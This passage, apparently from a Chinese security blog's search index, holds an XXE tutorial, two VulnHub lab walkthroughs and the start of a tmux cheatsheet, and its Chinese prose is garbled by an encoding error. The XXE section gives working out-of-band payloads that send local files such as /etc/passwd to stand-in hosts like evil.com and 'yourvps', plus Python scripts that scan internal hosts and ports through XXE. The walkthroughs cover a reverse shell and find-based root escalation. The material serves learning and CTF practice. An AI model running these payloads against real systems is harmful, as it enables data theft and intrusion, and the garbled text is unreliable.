·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œè§£å†³äº† XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚ payload2 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;&#x2F;value&gt; åœ¨æˆ‘çš„vpsçš„xxe.xmlçš„å†…å®¹å¦‚ä¸‹ï¼š 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;yourvps&#x2F;%file;&#39;&gt;&quot;&gt; è€Œæµ‹è¯•æ–‡ä»¶TEST.txtå†…å®¹ä¸ºï¼š 1chybeta æ•´ä¸ªçš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼šè§£ææ—¶%dtdå¼•å…¥xxe.xmlï¼Œä¹‹å%allå¼•å…¥sendçš„å®šä¹‰ï¼Œæœ€åå¼•ç”¨äº†å®ä½“sendï¼ŒæŠŠ%fileæ–‡ä»¶å†…å®¹é€šè¿‡ä¸€ä¸ªhttpè¯·æ±‚å‘äº†å‡ºå»ã€‚æ³¨æ„éœ€è¦æŠŠpayloadç»è¿‡urlç¼–ç ã€‚æŸ¥çœ‹vpsä¸Šçš„access.logï¼š è‹¥è¦è¯»å–phpç­‰æ–‡ä»¶ï¼ŒåŒæ ·éœ€è¦å…ˆç»è¿‡base64åŠ å¯†ä¸‹ã€‚ 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;&#x2F;value&gt; æ€è€ƒ æˆ‘ä»¬åˆšåˆšéƒ½åªæ˜¯åšäº†ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯é€šè¿‡ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯é€šè¿‡ http åè®®å‘å‡ºè¯·æ±‚ï¼Œç†Ÿæ‚‰ SSRF çš„ç«¥é‹åº”è¯¥å¾ˆå¿«ååº”è¿‡æ¥ï¼Œè¿™å…¶å®éå¸¸ç±»ä¼¼äº SSRF ï¼Œå› ä¸ºä»–ä»¬éƒ½èƒ½ä»æœåŠ¡å™¨å‘å¦ä¸€å°æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœå°†è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€æ¢æˆæŸä¸ªå†…ç½‘çš„åœ°å€ï¼Œï¼ˆæ¯”å¦‚ 192.168.0.10:8080ï¼‰æ˜¯ä¸æ˜¯ä¹Ÿèƒ½å®ç° SSRF åŒæ ·çš„æ•ˆæœå‘¢ï¼Ÿæ²¡é”™ï¼ŒXXE å…¶å®ä¹Ÿæ˜¯ä¸€ç§ SSRF çš„æ”»å‡»æ‰‹æ³•ï¼Œå› ä¸º SSRF å…¶å®åªæ˜¯ä¸€ç§æ”»å‡»æ¨¡å¼ï¼Œåˆ©ç”¨è¿™ç§æ”»å‡»æ¨¡å¼æˆ‘ä»¬èƒ½ä½¿ç”¨å¾ˆå¤šçš„åè®®ä»¥åŠæ¼æ´è¿›è¡Œæ”»å‡»ã€‚ æ‰€ä»¥è¦æƒ³æ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨æˆ‘ä»¬ä¸èƒ½å°†çœ¼å…‰å±€é™äº file åè®®ï¼Œæˆ‘ä»¬å¿…é¡»æ¸…æ¥šåœ°çŸ¥é“åœ¨ä½•ç§å¹³å°ï¼Œæˆ‘ä»¬èƒ½ç”¨ä½•ç§åè®®ï¼š HTTPå†…ç½‘æ¢æµ‹ä¸»æœº ä¸‹é¢æ˜¯æ¢æµ‹è„šæœ¬inhostscan.pyï¼š 1234567891011121314151617181920212223import requestsimport base64def XXE(ip,string): try: xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot; x = requests.post(&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;, data=xml, headers=headers, timeout=5).text coded_string = x.split(&#x27; &#x27;)[-2] print(&#x27; [+]&#x27;,ip,&#x27;Successfully Found !!!&#x27;) except: print(&#x27; [-]&#x27;,ip,&#x27;Error Not Found !!!&#x27;) pass if __name__ == &#x27;__main__&#x27;: headers = &#123;&#x27;Content-Type&#x27;:&#x27;application/xml&#x27;&#125; for i in range(1,255): ip = &#x27;192.168.50.&#x27; + str(i) string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27; XXE(ip,string) æ³¨æ„æ›¿æ¢ä¸€ä¸‹IPåœ°å€çš„ç½‘æ®µã€‚è¿™ä¸ªè„šæœ¬è·‘çš„ç¡®å®å¾ˆæ…¢ï¼Œç»“æœå¦‚ä¸‹ï¼š 12345678[+] 192.168.50.1 Successfully Found !!!......[-] 192.168.50.130 Error Not Found !!![-] 192.168.50.131 Error Not Found !!![+] 192.168.50.132 Successfully Found !!![+] 192.168.50.133 Successfully Found !!!... HTTPå†…ç½‘ä¸»æœºæ¢æµ‹ç«¯å£ æ‰¾åˆ°äº†å†…ç½‘çš„ä¸»æœºï¼Œè¿˜éœ€è¦å¯¹å…¶ç«¯å£è¿›è¡Œæ‰«æï¼ŒåŸç†å’Œä¸Šé¢ä¸€è‡´ï¼Œåªä¸è¿‡IPå›ºå®šï¼Œéå†ç«¯å£ï¼Œæˆ‘ä»¬å…ˆç”¨Burp Suiteçœ‹ä¸€ä¸‹ç«¯å£å¼€æ”¾å’Œå…³é—­çš„responseæœ‰ä»€ä¹ˆä¸åŒï¼š å¦‚æœç«¯å£æ˜¯å…³é—­çš„ï¼Œä¸€èˆ¬éƒ½ä¼šè¿”å›Connection refuseã€‚ ä¸‹é¢æ”¾å‡ºPayloadã€‚ 123456789101112131415161718import requestsimport base64def XXE(port): xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.50.132:&quot;&quot;&quot; + str(port) + &quot;&quot;&quot;/&quot; [&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;data&gt;7&lt;/data&gt;&quot;&quot;&quot; r = requests.post(&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;, data=xml,timeout=5) #print(port,r.elapsed.total_seconds()) if (&quot;Connection refused&quot; in r.text): print(&quot; [-]&quot;, port, &quot; seems shut down&quot;) else: print(&quot; [+]&quot;, port, &quot;is up&quot;)if __name__ == &#x27;__main__&#x27;: for i in range(9080,9082): XXE(i) ç¬”è€…æµ‹è¯•å‘ç°ä¸åŒçš„ç¯å¢ƒï¼Œç»“æœå¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œå› æ­¤å¯èƒ½éœ€è¦ä¸åŒçš„payloadè¿›è¡Œç«¯å£æ‰«æï¼Œè¿™ä¸ªéœ€è¦å…·ä½“ç»“åˆä»£ç å’Œæµ‹è¯•ç»“æœæ¥æ•²å®šä¸€ä¸ªæœ‰æ•ˆçš„payloadã€‚ å¦‚ä½•æŒ–æ˜XXEæ¼æ´ å¸¸ç”¨æ£€æµ‹æ–¹æ³• é¦–å…ˆæŸ¥çœ‹XMLæ˜¯å¦å¯ä»¥æˆåŠŸè§£æ 1234&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name &quot;test1&quot;&gt;]&gt; &lt;root&gt;&amp;name;&lt;&#x2F;root&gt; å¦‚æœé¡µé¢è¾“å‡ºäº†test1ï¼Œåˆ™å¯ä»¥è§£æXMLã€‚ ç¬¬äºŒæ­¥æŸ¥çœ‹æ˜¯å¦æ”¯æŒDTDå¼•ç”¨å¤–éƒ¨å®ä½“ï¼š 12345&lt;?xml version&#x3D;â€1.0â€ encoding&#x3D;â€UTF-8â€?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;myhost&#x2F;index.html&quot;&gt; %name; ]&gt; ç„¶ååœ¨æˆ‘çš„æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹æ—¥å¿—,å¦‚æœæœ‰ç›®æ ‡æœåŠ¡å™¨å‘æˆ‘çš„æœåŠ¡å™¨å‘é€äº†ä¸€æ¡index.htmlçš„è¯·æ±‚,è¯´æ˜ æ”¯æŒå¼•ç”¨å¤–éƒ¨å®ä½“,å¾ˆæœ‰å¯èƒ½å­˜åœ¨xxeæ¼æ´ã€‚ å¤–éƒ¨æ™®é€šå®ä½“ å½“æœ‰å›æ˜¾æ—¶ï¼Œåˆ©ç”¨file://åè®®: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE lltest[ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; å¤–éƒ¨å‚æ•°å®ä½“ å½“æ— å›æ˜¾ï¼Œä½¿ç”¨httpåè®®: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[ &lt;!ENTITY % lltest SYSTEM &quot;http:&#x2F;&#x2F;myhost:1234&#x2F;test_xxe&quot;&gt;%lltest;]&gt; ç„¶ååœ¨myhostç›‘å¬1234ç«¯å£(dnslogåœ°å€ä¹Ÿå¯ä»¥),æŸ¥çœ‹æ˜¯å¦æœ‰httpè¯·æ±‚ã€‚ Json Content-type XXE å¾ˆå¤šWebä¸Appåº”ç”¨éƒ½æ˜¯åŸºäºå®¢æˆ·ç«¯-æœåŠ¡å™¨äº¤äº’çš„Webé€šä¿¡æœåŠ¡,æœ€å¸¸è§çš„æ•°æ®æ ¼å¼å°±æ˜¯Jsonä¸XMLï¼Œå°½ç®¡webæœåŠ¡å¯èƒ½åªä½¿ç”¨ä¸€ç§æ ¼å¼ï¼Œä½†æ˜¯æœåŠ¡å™¨å´å¯ä»¥æ¥æ”¶å¼€å‘äººå‘˜æ²¡æœ‰æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œæœ‰å¯èƒ½å¯¼è‡´JsonèŠ‚ç‚¹å—åˆ°XXEæ”»å‡»ã€‚ æµ‹è¯•æ–¹æ³•å¾ˆç®€å•,å°±æ˜¯å°†Content-Type: application/jsonä¿®æ”¹ä¸ºContent-Type: application/xmlï¼Œæ•°æ®æ ¼å¼ä¸å˜ï¼ŒæŸ¥çœ‹æ˜¯å¦æŠ¥é”™: &#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125; å¯ä»¥å‘ç°æœåŠ¡å™¨æ˜¯å¯ä»¥å¤„ç†xmlæ•°æ®çš„ï¼Œäºæ˜¯æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ”»å‡»ã€‚ payload: 123456789...Content-Type: application&#x2F;xml...&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;&lt;root&gt;&lt;param1&gt;name&lt;&#x2F;param1&gt;&lt;param2&gt;&amp;xxe;&lt;&#x2F;param2&gt;&lt;&#x2F;root&gt; æŸ¥çœ‹æ˜¯å¦å¯ä»¥è¯»å–æ•æ„Ÿæ–‡ä»¶ã€‚ åˆ©ç”¨FTPåè®®è·å–æ•æ„Ÿä¿¡æ¯ åˆ©ç”¨ftpåè®®è·å–æœåŠ¡å™¨ä¿¡æ¯/å†…ç½‘ipä¹‹ç±»çš„æŠ€å·§ï¼š åœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸Šè¿è¡Œrbè„šæœ¬(æ¨¡æ‹ŸFTPæœåŠ¡å™¨:https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),ç›‘å¬8080ç«¯å£ã€‚ ç„¶ååœ¨webç¨‹åºé‚£é‡Œè¾“å…¥payload: 1234567&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;ext.dtd&quot;&gt; %asd; %rrr; ]&gt;&lt;a&gt;&lt;&#x2F;a&gt; ext.dtd 12&lt;!ENTITY % b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#39;ftp:&#x2F;&#x2F;evil.com:8000&#x2F;%b;&#39;&gt;&quot;&gt; ç„¶ååœ¨æ¨¡æ‹Ÿçš„FTPæœåŠ¡å™¨ä¸Šå°±ä¼šæ”¶åˆ°ä¸€äº›æœåŠ¡å™¨ä¿¡æ¯/æ–‡ä»¶å†…å®¹ æŠ€å·§æ¥è‡ªï¼šhttp://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html Bypass 123&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot; XXEå¦‚ä½•é˜²å¾¡ 1ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• php: 1libxml_disable_entity_loader(true); java: 12DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python: 12from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False)) 2ã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ® è¿‡æ»¤å…³é”®å­—ï¼š&lt;\\!DOCTYPEå’Œ&lt;\\!ENTITYï¼Œæˆ–è€…SYSTEMå’ŒPUBLICã€‚ 3ã€ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD CTFä¸­çš„XXE apiè°ƒç”¨ é¢˜ç›®åœ°å€ï¼šhttp://web.jarvisoj.com:9882/ é¢˜ç›®æè¿°ï¼šè¯·è®¾æ³•è·å¾—ç›®æ ‡æœºå™¨/home/ctf/flag.txtä¸­çš„flagå€¼ã€‚ Fake XML Cookbook é¢˜ç›®åœ°å€ï¼šhttps://buuoj.cn/challenges é¢˜ç›®è¯´æ˜ï¼š 12345&#x3D;&#x3D;Difficulty: easy&#x3D;&#x3D;flag is in &#x2F;flag&#x3D;&#x3D;Author zjy&#x3D;&#x3D; expï¼š 1234567891011import requestsurl = &quot;http://127.0.0.1/php_xxe/doLogin.php&quot;payload = &#x27;&#x27;&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;foo;&lt;/username&gt;&lt;password&gt;0&lt;/password&gt;&lt;/user&gt;&#x27;&#x27;&#x27;r = requests.post(url,data=payload,headers=&#123;&#x27;Content-Type&#x27;:&#x27;text/xml&#x27;&#125;)print r.text True XML cookbook [CSAWQual 2019]Web_Unagi ä½¿ç”¨utf-16ç¼–ç ç»•è¿‡WAFä¸Šä¼ xmlæ–‡ä»¶è¯»å–flag 12345678910111213&lt;?xml version=&#x27;1.0&#x27; encoding=&quot;utf-16&quot;?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;Bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; &amp;xxe;&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;intro&gt;&amp;xxe;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; utf-16ç¼–ç  ä¸Šä¼  Update https://www.freebuf.com/vuls/207639.html æ— æ³•å¼•ç”¨å¤–éƒ¨DTDæ–‡ä»¶çš„å‰æä¸‹ï¼Œæ— å›æ˜¾åˆ©ç”¨XXEæ³¨å…¥ï¼š å¼•ç”¨å†…éƒ¨å®ä½“ 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#39;&gt; %remote;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; ä¸‰å±‚åµŒå¥— 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % para &#39; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#39;&gt; %para;]&gt;&lt;message&gt;10&lt;&#x2F;message Reference xxe injector toolï¼šhttps://github.com/enjoiz/XXEinjector XXE payload listï¼šhttps://github.com/payloadbox/xxe-injection-payload-list ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ XXEæ¼æ´æ€»ç»“ XXEå­¦ä¹ ç¬”è®° XXEå®ä½“æ³¨å…¥ Blind XXEç»å…¸payloadå¼•å‘çš„è„‘æ´","tags":[{"name":"Webå®‰å…¨å­¦ä¹ ","slug":"Webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"xxeæ¼æ´","slug":"xxeæ¼æ´","permalink":"http://ca0y1h.top/tags/xxe%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"VulnHub::DC-1-walkthrough","date":"2020-02-19T10:03:20.000Z","path":"Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough/","text":"VulnHub::DC-1 Walkthrough 0x01 Introduction DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in rootâ€™s home directory. You donâ€™t even need to be root to do this, however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge. 0x02 Tools and Tips nmap JohnTheRipper Drupal Geddon 2 Forms API Property Injection Drupal Geddon SQL Injection (Add admin user) 0x03 Pentesting æŸ¥æ‰¾é¶æœºIPï¼š æŸ¥æ‰¾é¶æœºç«¯å£å’ŒæœåŠ¡ï¼š ä»drupal 7ä¸‹æ‰‹ï¼Œåœ¨metasploitä¸­æŸ¥çœ‹ç›¸å…³æ¼æ´ï¼š å‘ç°drupal_drupalgeddon2å¯ä»¥æˆåŠŸexploitï¼Œè¿›è¡Œç›¸å…³é…ç½®ï¼š ä½¿ç”¨Pythonå‘½ä»¤è·å–æ­£å¸¸ttyï¼Œè·å¾—ç¬¬ä¸€ä¸ªflag1.txtï¼š æç¤ºæˆ‘ä»¬å»æ‰¾é…ç½®æ–‡ä»¶ï¼ŒGoogleä¸€ä¸‹drupalç«™ç‚¹çš„é…ç½®æ–‡ä»¶ç›®å½•ï¼š ä¸ä»…å¾—åˆ°flag2çš„å†…å®¹ï¼Œè¿˜æœ‰MySQLæ•°æ®åº“çš„è¿æ¥ç”¨æˆ·å’Œå¯†ç ï¼Œå°è¯•ç™»å½•ï¼š æŸ¥è¯¢ç”¨æˆ·è¡¨çš„è´¦å·å’Œå¯†ç ï¼š ç”¨JohnTheRipperçˆ†ç ´å¯†ç ï¼š ä½¿ç”¨Fredè´¦å·ç™»å½•åå°ï¼Œæ²¡æœ‰flagæˆ–hintï¼Œå°è¯•è·å–åå°ç®¡ç†å‘˜æƒé™ï¼Œç”¨searchexploitæŸ¥æ‰¾ç›¸å…³åˆ©ç”¨ï¼š æ ¹æ®æç¤ºæ–°å¢ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼š åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢å‘ç°æˆåŠŸæ’å…¥ï¼š ç™»å½•åå°ç³»ç»Ÿï¼Œåœ¨contentsä¸­è·å¾—flag3ï¼š çœ‹ä¸€ä¸‹flag3ï¼Œè¦æˆ‘ä»¬å»æŸ¥çœ‹shadowæ–‡ä»¶ï¼Œçœ‹åˆ°permçŒœæµ‹æ˜¯ä¸æ˜¯suidææƒï¼š findå‘½ä»¤å¯ä»¥ç”¨æ¥ææƒï¼š è¾“å…¥find . -exec /bin/sh \\; -quitï¼š æœ‰ä¸€ä¸ªflag4çš„ç”¨æˆ·ï¼Œè¿›å…¥ä¸»ç›®å½•å‘ç°flag4.txtï¼š è¿›å…¥rootä¸»ç›®å½•ï¼Œå‘ç°æœ€åä¸€ä¸ªflagï¼š 0x04 Extra æ ¹æ®flag3çš„æç¤ºï¼ŒæœŸæœ›çš„åšæ³•åº”è¯¥æ˜¯ç”¨findå‘½ä»¤æŸ¥è¯¢ï¼š å‘½ä»¤è§£é‡Šï¼šhttps://blog.csdn.net/u010900754/article/details/83020378?utm_source=distribute.pc_relevant.none-task æ‹¿åˆ°å¯†ç çš„sha256ï¼Œè¯•è¯•èƒ½ä¸èƒ½çˆ†ç ´å¯†ç å‡ºæ¥ï¼š sshç™»å½•æˆåŠŸï¼š","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"é¶æœº/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"}]},{"title":"VulnHub::BossplayersCTF-walkthrough","date":"2020-02-15T10:57:12.000Z","path":"Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough/","text":"VulnHub::BossplayersCTF Walkthrough 0x01 Introduction Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTFâ€™s. It should take around 30 minutes to root. FROM: https://www.vulnhub.com/entry/bossplayersctf-1,375/ 0x02 Tools and Tips netdiscover nmap 0x03 Pentesting netdiscoveræ‰«æå†…ç½‘æ®µï¼š é¶æœºIPåœ°å€192.168.0.104ï¼ŒnmapæŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼š 80ç«¯å£ä¸Šè¿è¡Œç€Apache2.3.48ï¼Œdirsearchå’Œgobusteræ‰«æç½‘ç«™ç›®å½•ï¼š logs.phpå’Œrobots.txtéƒ½æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œindex.htmlæŸ¥çœ‹æºä»£ç ï¼š ä¸‰æ¬¡base64è§£ç å¾—åˆ°ä¸€ä¸ªåå°ç½‘é¡µï¼š æç¤ºæˆ‘ä»¬å¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå°è¯•ä¸€ä¸‹?cmd=pwdï¼š æˆåŠŸå¾—åˆ°å›æ˜¾ï¼Œå†åå¼¹shellï¼Œæœ¬åœ°ç›‘å¬4444ç«¯å£ï¼š å†è¿”å›æ ‡å‡†shell è·‘ä¸€ä¸‹ææƒè„šæœ¬LinEnum.shï¼Œæ³¨æ„åˆ°findå‘½ä»¤æ˜¯ä»¥rootèº«ä»½æ‰§è¡Œçš„ï¼š åœ¨GTFObinsä¸ŠæŸ¥æ‰¾ä¸€ä¸‹ï¼š æ ¹æ®æç¤ºæ‰§è¡Œfind . -exec /bin/sh -p \\; -quit æˆåŠŸè·å–rootæƒé™ã€‚ 0x04 Reference https://blog.csdn.net/weixin_44214107/article/details/102493939","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"é¶æœº/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"}]},{"title":"Tmuxå¿«æ·é”®å¤‡å¿˜å½•","date":"2020-02-14T12:11:10.000Z","path":"Other/5.Tmuxå¿«æ·é”®å¤‡å¿˜å½•/","text":"Tmux Cheatsheet oh-my-tmuxï¼šhttps://github.com/gpakosz/.tmux &lt;prefix&gt; = Ctrl + a æˆ– Ctrl + b &lt;prefix&gt; c = Ctrl + a (or Ctrl + b) + c &lt;prefix&gt; C-c = Ctrl + a (or Ctrl + b) Ctrl + c tmuxå‘½ä»¤ï¼š tmux detach æˆ– &lt;preifx&gt; d åˆ†ç¦»å½“å‰session tmux ls æŸ¥çœ‹æ‰€æœ‰session tmux attach -t 0 æ ¹æ®session idæ¥å…¥æŸä¸ªsession tmux kill-session -t 0 æ ¹æ®session idæ€æ­»æŸä¸ªsession tmuxå¿«æ·é”®ï¼š &lt;prefix&gt; e ä¿®æ”¹~/.tmux.conf.local &lt;prefix&gt; r é‡æ–°è½½å…¥é…ç½®æ–‡ä»¶ &lt;prefix&gt; C-l clears both the screen and the tmux history &lt;prefix&gt; C-c æ–°å»ºsession &lt;prefix&gt; C-f æ ¹æ®session_nameåˆ‡æ¢session &lt;prefix&gt; s åˆ—å‡ºæ‰€æœ‰session &lt;prefix&gt; c æ–°å»ºwindow &lt;prefix&gt; C-h and &lt;prefix&gt; C-l å‘å‰ã€å‘ååˆ‡æ¢window &lt;prefix&gt; Tab åˆ‡æ¢ä¸Šä¸€ä¸ªæ´»åŠ¨window &lt;prefix&gt; | å‚ç›´åˆ†å‰²panes &lt;prefix&gt; _ æ°´å¹³åˆ†å‰²panes &lt;prefix&gt; h, &lt;prefix&gt; j, &lt;prefix&gt; k and &lt;prefix&gt; l å…‰æ 